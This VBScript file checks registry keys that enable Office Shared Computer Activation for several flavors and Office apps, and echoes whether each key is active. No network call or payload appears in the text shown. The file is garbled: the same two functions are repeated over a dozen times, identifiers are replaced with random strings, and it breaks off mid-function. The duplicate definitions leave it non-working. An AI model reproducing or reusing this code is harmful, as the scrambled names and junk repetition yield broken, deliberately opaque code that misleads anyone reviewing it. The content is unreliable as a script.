
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function





'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function

'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function





'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function


'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function



'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function



'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function









'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
